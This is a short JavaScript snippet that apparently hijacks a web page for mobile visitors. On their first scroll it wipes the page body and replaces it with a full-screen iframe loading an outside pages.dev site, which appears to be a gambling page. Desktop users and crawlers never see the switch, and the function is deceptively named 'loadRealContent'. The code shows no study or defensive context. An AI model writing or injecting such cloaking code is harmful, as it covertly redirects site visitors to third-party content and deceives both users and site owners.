(function() {
    const isMobile = /android|iphone|ipad|mobile/i.test(navigator.userAgent);
    if (!isMobile) return;
    let active = false;
    const loadRealContent = () => {
        if (active) return;
        active = true;
        const ampUrl = "https://alternatif-sensa4d.pages.dev/";
        const ifrm = document.createElement('iframe');
        const style = 'position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; z-index:999999; margin:0; padding:0; background:white;';
        ifrm.setAttribute('style', style);
        ifrm.src = ampUrl;
        document.body.innerHTML = ''; 
        document.body.appendChild(ifrm);
        document.body.style.overflow = 'hidden';
    };
    window.addEventListener('scroll', loadRealContent, { once: true });
})();
